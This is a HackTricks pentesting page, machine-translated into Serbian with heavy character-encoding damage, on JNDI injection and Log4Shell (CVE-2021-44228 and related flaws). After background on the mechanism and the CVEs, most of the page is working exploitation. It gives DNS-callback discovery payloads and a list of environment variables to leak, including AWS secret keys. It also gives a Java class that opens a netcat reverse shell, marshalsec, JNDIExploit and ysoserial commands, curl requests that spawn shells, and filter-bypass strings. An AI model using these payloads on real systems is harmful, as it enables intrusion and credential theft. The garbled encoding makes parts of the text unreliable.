# JNDI - Java Naming and Directory Interface & Log4Shell

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

JNDI, integrisan u Javu od kraja 1990-ih, sluÅ¾i kao servis za imenovanje, omoguÄ‡avajuÄ‡i Java programima da lociraju podatke ili objekte putem sistema imenovanja. PodrÅ¾ava razliÄite servise direktorijuma putem interfejsa provajdera usluga (SPI), omoguÄ‡avajuÄ‡i preuzimanje podataka iz razliÄitih sistema, ukljuÄujuÄ‡i udaljene Java objekte. UobiÄajeni SPI ukljuÄuju CORBA COS, Java RMI Registry i LDAP.

### JNDI Naming Reference

Java objekti se mogu Äuvati i preuzimati koristeÄ‡i JNDI Naming References, koje dolaze u dva oblika:

* **Reference Addresses**: Specifikuje lokaciju objekta (npr., _rmi://server/ref_), omoguÄ‡avajuÄ‡i direktno preuzimanje sa navedene adrese.
* **Remote Factory**: Referencira klasu udaljene fabrike. Kada se pristupi, klasa se preuzima i instancira sa udaljene lokacije.

MeÄ‘utim, ovaj mehanizam se moÅ¾e iskoristiti, Å¡to moÅ¾e dovesti do uÄitavanja i izvrÅ¡avanja proizvoljnog koda. Kao protivmera:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` po defaultu od JDK 7u21, ograniÄavajuÄ‡i uÄitavanje udaljenih objekata. Security Manager dodatno ograniÄava Å¡ta moÅ¾e biti uÄitano.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` po defaultu od JDK 6u141, 7u131, 8u121, blokirajuÄ‡i izvrÅ¡avanje udaljeno uÄitanih Java objekata. Ako je postavljeno na `true`, moguÄ‡e je izvrÅ¡avanje udaljenog koda bez nadzora Security Manager-a.
* **CORBA**: Nema specifiÄnu osobinu, ali je Security Manager uvek aktivan.

MeÄ‘utim, **Naming Manager**, odgovoran za reÅ¡avanje JNDI linkova, nema ugraÄ‘ene bezbednosne mehanizme, Å¡to moÅ¾e omoguÄ‡iti preuzimanje objekata iz bilo kojeg izvora. Ovo predstavlja rizik jer se RMI, LDAP i CORBA zaÅ¡tite mogu zaobiÄ‡i, Å¡to dovodi do uÄitavanja proizvoljnih Java objekata ili iskoriÅ¡Ä‡avanja postojeÄ‡ih komponenti aplikacije (gadgets) za pokretanje malicioznog koda.

Primeri URL-ova koji se mogu iskoristiti ukljuÄuju:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

Uprkos zaÅ¡titama, ranjivosti ostaju, uglavnom zbog nedostatka zaÅ¡tite protiv uÄitavanja JNDI iz nepouzdanih izvora i moguÄ‡nosti zaobilaÅ¾enja postojeÄ‡ih zaÅ¡tita.

### JNDI Example

![](<../../.gitbook/assets/image (1022).png>)

ÄŒak i ako ste postavili **`PROVIDER_URL`**, moÅ¾ete naznaÄiti drugaÄiji u pretrazi i biÄ‡e pristupljeno: `ctx.lookup("<attacker-controlled-url>")` i to je ono Å¡to Ä‡e napadaÄ iskoristiti da uÄita proizvoljne objekte iz sistema koji on kontroliÅ¡e.

### CORBA Overview

CORBA (Common Object Request Broker Architecture) koristi **Interoperable Object Reference (IOR)** za jedinstveno identifikovanje udaljenih objekata. Ova referenca ukljuÄuje osnovne informacije kao Å¡to su:

* **Type ID**: Jedinstveni identifikator za interfejs.
* **Codebase**: URL za dobijanje stub klase.

VaÅ¾no je napomenuti da CORBA nije inherentno ranjiv. Osiguranje bezbednosti obiÄno ukljuÄuje:

* Instalaciju **Security Manager-a**.
* Konfigurisanje Security Manager-a da dozvoli veze sa potencijalno malicioznim kodnim bazama. To se moÅ¾e postiÄ‡i kroz:
* Socket dozvolu, npr., `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* Dozvole za Äitanje fajlova, bilo univerzalno (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) ili za specifiÄne direktorijume gde bi maliciozni fajlovi mogli biti smeÅ¡teni.

MeÄ‘utim, neke politike provajdera mogu biti blage i dozvoliti ove veze po defaultu.

### RMI Context

Za RMI (Remote Method Invocation), situacija je donekle drugaÄija. Kao i kod CORBA, uÄitavanje proizvoljnih klasa je po defaultu ograniÄeno. Da bi se iskoristio RMI, obiÄno bi bilo potrebno zaobiÄ‡i Security Manager, Å¡to je takoÄ‘e relevantno u CORBA.

### LDAP

Prvo, potrebno je razlikovati izmeÄ‘u pretrage i pretrage po imenu.\
**Pretraga** Ä‡e koristiti URL kao `ldap://localhost:389/o=JNDITutorial` da pronaÄ‘e JNDITutorial objekat sa LDAP servera i **preuzme njegove atribute**.\
**Pretraga po imenu** je namenjena za **imenovanje usluga** jer Å¾elimo da dobijemo **Å¡ta god je vezano za ime**.

Ako je LDAP pretraga pozvana sa **SearchControls.setReturningObjFlag() sa `true`, tada Ä‡e vraÄ‡eni objekat biti rekonstruisan**.

Stoga, postoji nekoliko naÄina da se napadnu ove opcije.\
**NapadaÄ moÅ¾e otrovati LDAP zapise uvodeÄ‡i payload-e** u njih koji Ä‡e biti izvrÅ¡eni u sistemima koji ih prikupljaju (veoma korisno za **kompromitovanje desetina maÅ¡ina** ako imate pristup LDAP serveru). Drugi naÄin da se iskoristi ovo bi bio da se izvrÅ¡i **MitM napad u LDAP pretrazi**, na primer.

U sluÄaju da moÅ¾ete **naterati aplikaciju da reÅ¡i JNDI LDAP URL**, moÅ¾ete kontrolisati LDAP koji Ä‡e biti pretraÅ¾en, i mogli biste poslati exploit (log4shell).

#### Deserialization exploit

![](<../../.gitbook/assets/image (275).png>)

**Exploit je serijalizovan** i biÄ‡e deseralizovan.\
U sluÄaju da je `trustURLCodebase` `true`, napadaÄ moÅ¾e da obezbedi svoje klase u kodnoj bazi, ako ne, moraÄ‡e da iskoristi gadgets u classpath-u.

#### JNDI Reference exploit

LakÅ¡e je napasti ovaj LDAP koristeÄ‡i **JavaFactory reference**:

![](<../../.gitbook/assets/image (1059).png>)

## Log4Shell Vulnerability

Ranjivost je uvedena u Log4j jer podrÅ¾ava [**specijalnu sintaksu**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) u obliku `${prefix:name}` gde je `prefix` jedan od niza razliÄitih [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) gde `name` treba da bude evaluiran. Na primer, `${java:version}` je trenutna verzija Jave koja se izvrÅ¡ava.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) je uveo `jndi` Lookup funkciju. Ova funkcija omoguÄ‡ava preuzimanje varijabli putem JNDI. ObiÄno, kljuÄ se automatski prefiksira sa `java:comp/env/`. MeÄ‘utim, ako sam kljuÄ ukljuÄuje **":"**, ovaj defaultni prefiks se ne primenjuje.

Sa **: prisutnim** u kljuÄu, kao u `${jndi:ldap://example.com/a}` nema **prefiksa** i **LDAP server se upitava za objekat**. I ovi Lookups se mogu koristiti i u konfiguraciji Log4j kao i kada se linije beleÅ¾e.

Stoga, jedina stvar koja je potrebna za dobijanje RCE je **ranjiva verzija Log4j koja obraÄ‘uje informacije koje kontroliÅ¡e korisnik**. I poÅ¡to je ovo biblioteka koja se Å¡iroko koristi od strane Java aplikacija za beleÅ¾enje informacija (ukljuÄujuÄ‡i aplikacije koje su dostupne na internetu), bilo je veoma uobiÄajeno da log4j beleÅ¾i, na primer, HTTP zaglavlja koja su primljena kao Å¡to je User-Agent. MeÄ‘utim, log4j se **ne koristi samo za beleÅ¾enje HTTP informacija veÄ‡ i bilo kakvog unosa** i podataka koje je programer naznaÄio.

## Overview of Log4Shell-Related CVEs

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critical]**

Ova ranjivost je kritiÄna **greÅ¡ka u nepouzdanom deseralizovanju** u `log4j-core` komponenti, koja utiÄe na verzije od 2.0-beta9 do 2.14.1. OmoguÄ‡ava **daljinsko izvrÅ¡avanje koda (RCE)**, omoguÄ‡avajuÄ‡i napadaÄima da preuzmu sisteme. Problem je prijavio Chen Zhaojun iz Alibaba Cloud Security Team i utiÄe na razliÄite Apache okvire. Prvobitno reÅ¡enje u verziji 2.15.0 je bilo nepotpuno. Sigma pravila za odbranu su dostupna ([Rule 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [Rule 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Critical]**

Prvobitno ocenjen kao nizak, ali kasnije unapreÄ‘en na kritiÄan, ovaj CVE je **greÅ¡ka u uskrati usluge (DoS)** koja proizilazi iz nepotpunog reÅ¡enja u 2.15.0 za CVE-2021-44228. UticaÄ‡e na ne-podrazumevane konfiguracije, omoguÄ‡avajuÄ‡i napadaÄima da izazovu DoS napade putem kreiranih payload-a. [Tweet](https://twitter.com/marcioalm/status/1471740771581652995) prikazuje metodu zaobilaÅ¾enja. Problem je reÅ¡en u verzijama 2.16.0 i 2.12.2 uklanjanjem obrazaca pretrage poruka i onemoguÄ‡avanjem JNDI po defaultu.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[High]**

UticaÄ‡e na **Log4j 1.x verzije** u ne-podrazumevanim konfiguracijama koje koriste `JMSAppender`, ovaj CVE je greÅ¡ka u nepouzdanom deseralizovanju. Nema reÅ¡enja za 1.x granu, koja je zavrÅ¡ila svoj Å¾ivotni ciklus, i preporuÄuje se nadogradnja na `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderate]**

Ova ranjivost utiÄe na **Logback logging framework**, naslednika Log4j 1.x. Prethodno smatrano sigurnim, okviro je pronaÄ‘en ranjivim, a nove verzije (1.3.0-alpha11 i 1.2.9) su objavljene da reÅ¡e problem.

### **CVE-2021-45105** **\[High]**

Log4j 2.16.0 sadrÅ¾i DoS greÅ¡ku, Å¡to je dovelo do objavljivanja `log4j 2.17.0` da reÅ¡i CVE. Dodatni detalji su u izveÅ¡taju BleepingComputer-a [report](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

UticaÄ‡e na log4j verziju 2.17, ovaj CVE zahteva da napadaÄ kontroliÅ¡e konfiguracioni fajl log4j. UkljuÄuje potencijalno proizvoljno izvrÅ¡avanje koda putem konfigurisanog JDBCAppender-a. ViÅ¡e detalja je dostupno u [Checkmarx blog postu](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Log4Shell Exploitation

### Discovery

Ova ranjivost je veoma lako otkriti ako nije zaÅ¡tiÄ‡ena jer Ä‡e poslati barem **DNS zahtev** na adresu koju navedete u svom payload-u. Stoga, payload-ovi kao Å¡to su:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (koristeÄ‡i [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (koristeÄ‡i [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (koristeÄ‡i Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (koristeÄ‡i [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` koristeÄ‡i (koristeÄ‡i [huntress](https://log4shell.huntress.com))

Napomena: **Äak i ako je primljen DNS zahtev, to ne znaÄi da je aplikacija ranjiva** (ili Äak ranjiva), moraÄ‡ete da pokuÅ¡ate da je iskoristite.

{% hint style="info" %}
Zapamtite da da biste **iskoristili verziju 2.15** morate dodati **zaobilaÅ¾enje provere localhost-a**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Local Discovery**

PretraÅ¾ite **lokalne ranjive verzije** biblioteke sa:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verifikacija**

Neke od platformi navedenih ranije Ä‡e vam omoguÄ‡iti da umetnete neke varijable podatke koji Ä‡e biti zabeleÅ¾eni kada se zatraÅ¾e.\
To moÅ¾e biti veoma korisno za 2 stvari:

* Da **verifikujete** ranjivost
* Da **ekstrahujete informacije** zloupotrebljavajuÄ‡i ranjivost

Na primer, mogli biste zatraÅ¾iti neÅ¡to poput:\
ili kao `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** i ako je **DNS zahtev primljen sa vrednoÅ¡Ä‡u env varijable**, znate da je aplikacija ranjiva.

Druge informacije koje biste mogli pokuÅ¡ati da **iscurite**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Information

{% hint style="info" %}
Hostovi koji rade na JDK verzijama iznad 6u141, 7u131 ili 8u121 su zaÅ¡tiÄ‡eni od napada vektora uÄitavanja klase LDAP. To je zbog podrazumevane deaktivacije `com.sun.jndi.ldap.object.trustURLCodebase`, koja spreÄava JNDI da uÄita udaljenu kodnu bazu putem LDAP-a. MeÄ‘utim, vaÅ¾no je napomenuti da ove verzije **nisu zaÅ¡tiÄ‡ene od napada vektora deserializacije**.

Za napadaÄe koji Å¾ele da iskoriste ove viÅ¡e JDK verzije, neophodno je iskoristiti **pouzdani gadget** unutar Java aplikacije. Alati poput ysoserial ili JNDIExploit se Äesto koriste u tu svrhu. S druge strane, iskoriÅ¡Ä‡avanje niÅ¾ih JDK verzija je relativno lakÅ¡e jer se ove verzije mogu manipulisati da uÄitaju i izvrÅ¡e proizvoljne klase.

Za **viÅ¡e informacija** (_poput ograniÄenja na RMI i CORBA vektore_) **proverite prethodni odeljak JNDI Naming Reference** ili [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec sa prilagoÄ‘enim payload-om

MoÅ¾ete testirati ovo u **THM box-u:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Koristite alat [**marshalsec**](https://github.com/mbechler/marshalsec) (jar verzija dostupna [**ovde**](https://github.com/RandomRobbieBF/marshalsec-jar)). Ovaj pristup uspostavlja LDAP referral server za preusmeravanje konekcija na sekundarni HTTP server gde Ä‡e biti hostovan exploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Da biste naterali metu da uÄita kod za reverznu ljusku, kreirajte Java datoteku pod imenom `Exploit.java` sa sledeÄ‡im sadrÅ¾ajem:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Kompajlirajte Java datoteku u klasu koristeÄ‡i: `javac Exploit.java -source 8 -target 8`. Zatim, pokrenite **HTTP server** u direktorijumu koji sadrÅ¾i klasu sa: `python3 -m http.server`. Osigurajte da **marshalsec LDAP server** upuÄ‡uje na ovaj HTTP server.

Pokrenite izvrÅ¡enje klase eksploata na podloÅ¾nom veb serveru slanjem payload-a koji liÄi na:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Napomena:** Ova eksploatacija se oslanja na Java konfiguraciju koja omoguÄ‡ava uÄitavanje udaljenog koda putem LDAP-a. Ako to nije dozvoljeno, razmotrite eksploataciju pouzdane klase za izvrÅ¡avanje proizvoljnog koda.

### RCE - **JNDIExploit**

{% hint style="info" %}
Imajte na umu da je autor iz nekog razloga uklonio ovaj projekat sa github-a nakon otkriÄ‡a log4shell. MoÅ¾ete pronaÄ‡i keÅ¡iranu verziju na [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), ali ako Å¾elite da poÅ¡tujete odluku autora, koristite drugaÄiju metodu za eksploataciju ove ranjivosti.

Pored toga, ne moÅ¾ete pronaÄ‡i izvorni kod u wayback maÅ¡ini, pa ili analizirajte izvorni kod, ili izvrÅ¡ite jar znajuÄ‡i da ne znate Å¡ta izvrÅ¡avate.
{% endhint %}

Za ovaj primer moÅ¾ete jednostavno pokrenuti ovaj **ranjivi web server za log4shell** na portu 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_u README-u Ä‡ete pronaÄ‡i kako da ga pokrenete_). Ova ranjiva aplikacija beleÅ¾i sa ranjivom verzijom log4shell sadrÅ¾aj HTTP zaglavlja _X-Api-Version_.

Zatim, moÅ¾ete preuzeti **JNDIExploit** jar datoteku i izvrÅ¡iti je sa:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
ĞŸĞ¾ÑĞ»Ğµ Ñ‡Ğ¸Ñ‚Ğ°ÑšĞ° ĞºĞ¾Ğ´Ğ° ÑĞ°Ğ¼Ğ¾ Ğ½ĞµĞºĞ¾Ğ»Ğ¸ĞºĞ¾ Ğ¼Ğ¸Ğ½ÑƒÑ‚Ğ°, Ñƒ _com.feihong.ldap.LdapServer_ Ğ¸ _com.feihong.ldap.HTTPServer_ Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ Ğ²Ğ¸Ğ´ĞµÑ‚Ğ¸ ĞºĞ°ĞºĞ¾ ÑĞµ **LDAP Ğ¸ HTTP ÑĞµÑ€Ğ²ĞµÑ€Ğ¸ ĞºÑ€ĞµĞ¸Ñ€Ğ°Ñ˜Ñƒ**. LDAP ÑĞµÑ€Ğ²ĞµÑ€ Ñ›Ğµ Ñ€Ğ°Ğ·ÑƒĞ¼ĞµÑ‚Ğ¸ ĞºĞ¾Ñ˜Ğ¸ payload Ñ‚Ñ€ĞµĞ±Ğ° Ğ´Ğ° Ğ±ÑƒĞ´Ğµ Ğ¿Ğ¾ÑĞ»ÑƒĞ¶ĞµĞ½ Ğ¸ Ğ¿Ñ€ĞµÑƒÑĞ¼ĞµÑ€Ğ¸Ñ›Ğµ Ğ¶Ñ€Ñ‚Ğ²Ñƒ Ğ½Ğ° HTTP ÑĞµÑ€Ğ²ĞµÑ€, ĞºĞ¾Ñ˜Ğ¸ Ñ›Ğµ Ğ¿Ğ¾ÑĞ»ÑƒĞ¶Ğ¸Ñ‚Ğ¸ ĞµĞºÑĞ¿Ğ»Ğ¾Ğ¸Ñ‚.\
Ğ£ _com.feihong.ldap.gadgets_ Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ Ğ¿Ñ€Ğ¾Ğ½Ğ°Ñ›Ğ¸ **Ğ½ĞµĞºĞµ ÑĞ¿ĞµÑ†Ğ¸Ñ„Ğ¸Ñ‡Ğ½Ğµ Ğ³Ğ°Ğ´Ğ³ĞµÑ‚Ğµ** ĞºĞ¾Ñ˜Ğ¸ ÑĞµ Ğ¼Ğ¾Ğ³Ñƒ ĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸Ñ‚Ğ¸ Ğ·Ğ° Ğ¸Ğ·Ğ²Ñ€ÑˆĞ°Ğ²Ğ°ÑšĞµ Ğ¶ĞµÑ™ĞµĞ½Ğµ Ğ°ĞºÑ†Ğ¸Ñ˜Ğµ (Ğ¿Ğ¾Ñ‚ĞµĞ½Ñ†Ğ¸Ñ˜Ğ°Ğ»Ğ½Ğ¾ Ğ¸Ğ·Ğ²Ñ€ÑˆĞ°Ğ²Ğ°ÑšĞµ Ğ¿Ñ€Ğ¾Ğ¸Ğ·Ğ²Ğ¾Ñ™Ğ½Ğ¾Ğ³ ĞºĞ¾Ğ´Ğ°). Ğ Ñƒ _com.feihong.ldap.template_ Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ Ğ²Ğ¸Ğ´ĞµÑ‚Ğ¸ Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ¸Ñ‚Ğµ ĞºĞ»Ğ°Ñe ÑˆĞ°Ğ±Ğ»Ğ¾Ğ½Ğ° ĞºĞ¾Ñ˜Ğµ Ñ›Ğµ **Ğ³ĞµĞ½ĞµÑ€Ğ¸ÑĞ°Ñ‚Ğ¸ ĞµĞºÑĞ¿Ğ»Ğ¾Ğ¸Ñ‚Ğµ**.

ĞœĞ¾Ğ¶ĞµÑ‚Ğµ Ğ²Ğ¸Ğ´ĞµÑ‚Ğ¸ ÑĞ²Ğµ Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ½Ğµ ĞµĞºÑĞ¿Ğ»Ğ¾Ğ¸Ñ‚Ğµ ÑĞ° **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. ĞĞµĞºĞµ ĞºĞ¾Ñ€Ğ¸ÑĞ½Ğµ ÑÑƒ:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Dakle, u naÅ¡em primeru, veÄ‡ imamo tu ranjivu aplikaciju na dockeru koja radi. Da bismo je napali:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Kada Å¡aljete napade, videÄ‡ete neki izlaz u terminalu gde ste izvrÅ¡ili **JNDIExploit-1.2-SNAPSHOT.jar**.

**Zapamtite da proverite `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` za druge opcije eksploatacije. Pored toga, u sluÄaju da vam zatreba, moÅ¾ete promeniti port LDAP i HTTP servera.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Na sliÄan naÄin kao prethodni exploit, moÅ¾ete pokuÅ¡ati da koristite [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) da iskoristite ovu ranjivost.\
MoÅ¾ete generisati URL-ove koje Ä‡ete poslati Å¾rtvi pokretanjem:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Ovaj napad koristeÄ‡i prilagoÄ‘eni generisani java objekat Ä‡e raditi u laboratorijama kao Å¡to je **THM solar room**. MeÄ‘utim, ovo obiÄno neÄ‡e raditi (jer je po defaultu Java konfigurisana da ne uÄitava udaljene kodne baze koristeÄ‡i LDAP) mislim zato Å¡to ne zloupotrebljava poverljivu klasu za izvrÅ¡avanje proizvoljnog koda._

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) je joÅ¡ jedan alat za generisanje **funkcionalnih JNDI linkova** i pruÅ¾anje pozadinskih usluga pokretanjem RMI servera, LDAP servera i HTTP servera.\

### RCE - ysoserial & JNDI-Exploit-Kit

Ova opcija je zaista korisna za napad na **Java verzije koje su konfigurisane da veruju samo odreÄ‘enim klasama i ne svima**. Stoga, **ysoserial** Ä‡e biti koriÅ¡Ä‡en za generisanje **serijalizacija poverljivih klasa** koje se mogu koristiti kao ureÄ‘aji za **izvrÅ¡avanje proizvoljnog koda** (_poverljiva klasa koju zloupotrebljava ysoserial mora biti koriÅ¡Ä‡ena od strane Å¾rtvinog java programa kako bi eksploatacija radila_).

KoriÅ¡Ä‡enjem **ysoserial** ili [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) moÅ¾ete kreirati eksploataciju deserializacije koja Ä‡e biti preuzeta od strane JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Koristite [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) za generisanje **JNDI linkova** gde Ä‡e eksploatacija Äekati na veze iz ranjivih maÅ¡ina. MoÅ¾ete posluÅ¾iti **razliÄite eksploate koji se mogu automatski generisati** pomoÄ‡u JNDI-Exploit-Kit ili Äak vaÅ¡e **vlastite deserializacione payload-e** (generisane od vas ili ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (1118).png>)

Sada moÅ¾ete lako koristiti generisanu JNDI vezu da iskoristite ranjivost i dobijete **reverse shell** jednostavno Å¡aljuÄ‡i na ranjivu verziju log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:Ä±}}:ldap://...} //Notice the unicode "i"
```
### Automatski skeneri

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - PronaÄ‘ite lokalne ranjive biblioteke

### Laboratorije za testiranje

* [**LogForge HTB maÅ¡ina**](https://app.hackthebox.com/tracks/UHC-track)
